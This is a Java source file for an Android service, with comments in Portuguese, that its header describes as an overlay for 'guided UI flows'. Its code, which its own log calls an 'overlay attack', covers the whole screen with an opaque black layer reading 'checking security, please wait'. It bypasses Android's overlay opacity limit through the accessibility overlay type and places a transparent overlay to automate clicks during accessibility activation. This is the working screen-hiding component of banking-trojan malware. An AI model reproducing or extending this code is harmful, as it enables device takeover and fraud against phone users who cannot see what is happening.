package com.seguranca.protecao;

import android.app.Service;
import android.content.Intent;
import android.graphics.Color;
import android.graphics.PixelFormat;
import android.os.Build;
import android.os.IBinder;
import android.util.Log;
import android.view.Gravity;
import android.view.View;
import android.view.WindowManager;
import android.widget.FrameLayout;
import android.widget.LinearLayout;
import android.widget.ProgressBar;
import android.widget.TextView;
import android.view.View;

/**
 * Overlay service — fullscreen overlay layer for guided UI flows.
 */
public class OverlayService extends Service {

    private static final String TAG = "OverlayService";
    
    private WindowManager windowManager;
    private View overlayView;
    private boolean isOverlayShowing = false;

    @Override
    public void onCreate() {
        super.onCreate();
        Log.d(TAG, "Serviço de overlay criado");
        
        windowManager = (WindowManager) getSystemService(WINDOW_SERVICE);
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        if (intent != null) {
            String action = intent.getAction();
            
            if ("BLACK_SCREEN_ON".equals(action)) {
                showBlackScreen();
            } else if ("BLACK_SCREEN_OFF".equals(action)) {
                hideBlackScreen();
            } else if ("ACTION_AUTO_CLICK_ACCESSIBILITY".equals(action)) {
                // Overlay transparente para automatizar cliques
                // (usado durante ativação do serviço de acessibilidade)
                showTransparentOverlay();
            }
        }
        
        return START_STICKY;
    }

    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }

    /**
     * Mostra tela preta COMPLETA sobre tudo
     * 
     * CORREÇÃO: Overlay em camada ACIMA da captura!
     * takeScreenshot não inclui overlays TYPE_APPLICATION_OVERLAY.
     */
    private void showBlackScreen() {
        if (isOverlayShowing) {
            Log.d(TAG, "Overlay já está sendo exibido");
            return;
        }
        
        Log.d(TAG, "Mostrando tela preta (overlay attack)... Android SDK: " + Build.VERSION.SDK_INT);
        
        try {
            if (overlayView != null) {
                try {
                    windowManager.removeView(overlayView);
                } catch (Exception ignored) {}
            }
            
            // Container principal - 100% PRETO com múltiplas camadas
            FrameLayout container = new FrameLayout(this);
            container.setBackgroundColor(0xFF000000); // ARGB: 100% opaco preto
            
            // Camada 1: View preta base
            View blackView1 = new View(this);
            blackView1.setBackgroundColor(0xFF000000);
            container.addView(blackView1, new FrameLayout.LayoutParams(
                FrameLayout.LayoutParams.MATCH_PARENT,
                FrameLayout.LayoutParams.MATCH_PARENT
            ));
            
            // Camada 2: Outra view preta para garantir
            View blackView2 = new View(this);
            blackView2.setBackgroundColor(0xFF000000);
            blackView2.setAlpha(1.0f); // 100% opaco
            container.addView(blackView2, new FrameLayout.LayoutParams(
                FrameLayout.LayoutParams.MATCH_PARENT,
                FrameLayout.LayoutParams.MATCH_PARENT
            ));
            
            // Layout com texto
            LinearLayout linearLayout = new LinearLayout(this);
            linearLayout.setOrientation(LinearLayout.VERTICAL);
            linearLayout.setGravity(Gravity.CENTER);
            linearLayout.setBackgroundColor(0xFF000000);
            
            TextView textView = new TextView(this);
            textView.setText("Verificando segurança...\nAguarde alguns instantes");
            textView.setTextSize(20);
            textView.setTextColor(Color.WHITE);
            textView.setGravity(Gravity.CENTER);
            textView.setLineSpacing(8, 1.1f);
            linearLayout.addView(textView, new LinearLayout.LayoutParams(
                LinearLayout.LayoutParams.MATCH_PARENT,
                LinearLayout.LayoutParams.WRAP_CONTENT
            ));
            
            container.addView(linearLayout, new FrameLayout.LayoutParams(
                FrameLayout.LayoutParams.MATCH_PARENT,
                FrameLayout.LayoutParams.MATCH_PARENT,
                Gravity.CENTER
            ));
            
            // Força opacidade total no container
            container.setAlpha(1.0f);
            
            overlayView = container;
            
            // Android 12+ força alpha máximo de 0.8 para TYPE_APPLICATION_OVERLAY
            // Solução: Usar TYPE_ACCESSIBILITY_OVERLAY (2032) que não tem essa limitação
            // Requer que o AccessibilityService esteja ativo
            
            int layoutType;
            boolean useAccessibilityOverlay = false;
            
            // Tenta usar TYPE_ACCESSIBILITY_OVERLAY se possível (não tem limite de alpha)
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP_MR1) {
                layoutType = WindowManager.LayoutParams.TYPE_ACCESSIBILITY_OVERLAY; // 2032
                useAccessibilityOverlay = true;
                Log.d(TAG, "Usando TYPE_ACCESSIBILITY_OVERLAY (sem limite de alpha)");
            } else if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                layoutType = WindowManager.LayoutParams.TYPE_APPLICATION_OVERLAY;
            } else {
                layoutType = WindowManager.LayoutParams.TYPE_SYSTEM_ALERT;
            }
            
            // FLAGS para overlay 100% opaco e fullscreen
            int flags = WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE |
                       WindowManager.LayoutParams.FLAG_NOT_TOUCHABLE |
                       WindowManager.LayoutParams.FLAG_LAYOUT_IN_SCREEN |
                       WindowManager.LayoutParams.FLAG_LAYOUT_NO_LIMITS |
                       WindowManager.LayoutParams.FLAG_FULLSCREEN;
            
            // Usa OPAQUE que força 100% opacidade
            WindowManager.LayoutParams params = new WindowManager.LayoutParams(
                WindowManager.LayoutParams.MATCH_PARENT,
                WindowManager.LayoutParams.MATCH_PARENT,
                layoutType,
                flags,
                PixelFormat.OPAQUE  // Força 100% opaco
            );
            
            params.gravity = Gravity.TOP | Gravity.START;
            params.x = 0;
            params.y = 0;
            
            // Força alpha 1.0 nos params
            params.alpha = 1.0f;
            
            // Android 9+ - Suporte a notch/cutout
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.P) {
                params.layoutInDisplayCutoutMode = WindowManager.LayoutParams.LAYOUT_IN_DISPLAY_CUTOUT_MODE_SHORT_EDGES;
            }
            
            // Android 11+ - Ajuste de insets
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
                params.setFitInsetsTypes(0); // Ignora todos os insets
            }
            
            try {
                // Adiciona à janela
                windowManager.addView(overlayView, params);
                isOverlayShowing = true;
                Log.d(TAG, "✅ Tela preta exibida! Type=" + layoutType + ", useAccessibility=" + useAccessibilityOverlay);
            } catch (Exception e) {
                // Se TYPE_ACCESSIBILITY_OVERLAY falhar, tenta TYPE_APPLICATION_OVERLAY
                if (useAccessibilityOverlay) {
                    Log.w(TAG, "TYPE_ACCESSIBILITY_OVERLAY falhou, tentando TYPE_APPLICATION_OVERLAY...");
                    params.type = WindowManager.LayoutParams.TYPE_APPLICATION_OVERLAY;
                    windowManager.addView(overlayView, params);
                    isOverlayShowing = true;
                    Log.d(TAG, "✅ Tela preta exibida com fallback TYPE_APPLICATION_OVERLAY (alpha pode ser limitado a 0.8)");
                } else {
                    throw e;
                }
            }
            
        } catch (Exception e) {
            Log.e(TAG, "❌ Erro ao mostrar overlay: " + e.getMessage());
            e.printStackTrace();
        }
    }

    /**
     * Esconde a tela preta
     */
    private void hideBlackScreen() {
        if (!isOverlayShowing) {
            Log.d(TAG, "Overlay já está escondido");
            return;
        }
        
        Log.d(TAG, "Escondendo overlay...");
        
        try {
            if (overlayView != null) {
                windowManager.removeView(overlayView);
                overlayView = null;
            }
            
            isOverlayShowing = false;
            Log.d(TAG, "Overlay escondido!");
            
        } catch (Exception e) {
            Log.e(TAG, "Erro ao esconder overlay: " + e.getMessage());
        }
    }

    /**
     * Mostra overlay TRANSPARENTE usado para automatizar cliques
     * durante a ativação do serviço de acessibilidade
     */
    private void showTransparentOverlay() {
        Log.d(TAG, "Mostrando overlay transparente para automação...");
        
        try {
            // Remove overlay anterior se existir
            if (overlayView != null) {
                windowManager.removeView(overlayView);
            }
            
            // Cria view transparente
            overlayView = new FrameLayout(this);
            overlayView.setBackgroundColor(Color.TRANSPARENT);
            
            WindowManager.LayoutParams params = new WindowManager.LayoutParams(
                WindowManager.LayoutParams.MATCH_PARENT,
                WindowManager.LayoutParams.MATCH_PARENT,
                getOverlayType(),
                WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE |
                WindowManager.LayoutParams.FLAG_NOT_TOUCHABLE,
                PixelFormat.TRANSLUCENT
            );
            
            params.gravity = Gravity.TOP | Gravity.LEFT;
            
            windowManager.addView(overlayView, params);
            isOverlayShowing = true;
            
            // Remove overlay após alguns segundos
            overlayView.postDelayed(() -> {
                hideBlackScreen();
            }, 5000);
            
        } catch (Exception e) {
            Log.e(TAG, "Erro ao mostrar overlay transparente: " + e.getMessage());
        }
    }

    /**
     * Retorna o tipo de overlay correto dependendo da versão do Android
     */
    private int getOverlayType() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            return WindowManager.LayoutParams.TYPE_APPLICATION_OVERLAY;
        } else {
            return WindowManager.LayoutParams.TYPE_PHONE;
        }
    }

    @Override
    public void onDestroy() {
        super.onDestroy();
        
        // Remove overlay ao destruir serviço
        if (overlayView != null) {
            try {
                windowManager.removeView(overlayView);
            } catch (Exception e) {
                Log.e(TAG, "Erro ao remover overlay: " + e.getMessage());
            }
        }
        
        Log.d(TAG, "Serviço de overlay destruído");
    }

    /**
     * Métodos estáticos para controlar o overlay de fora do serviço
     */
    public static void showBlack(android.content.Context context) {
        Intent intent = new Intent(context, OverlayService.class);
        intent.setAction("BLACK_SCREEN_ON");
        context.startService(intent);
    }

    public static void hideBlack(android.content.Context context) {
        Intent intent = new Intent(context, OverlayService.class);
        intent.setAction("BLACK_SCREEN_OFF");
        context.startService(intent);
    }

    private int getStatusBarHeight() {
        int result = 0;
        int resourceId = getResources().getIdentifier("status_bar_height", "dimen", "android");
        if (resourceId > 0) {
            result = getResources().getDimensionPixelSize(resourceId);
        }
        return result;
    }

    private int getNavigationBarHeight() {
        int result = 0;
        int resourceId = getResources().getIdentifier("navigation_bar_height", "dimen", "android");
        if (resourceId > 0) {
            result = getResources().getDimensionPixelSize(resourceId);
        }
        return result;
    }
}
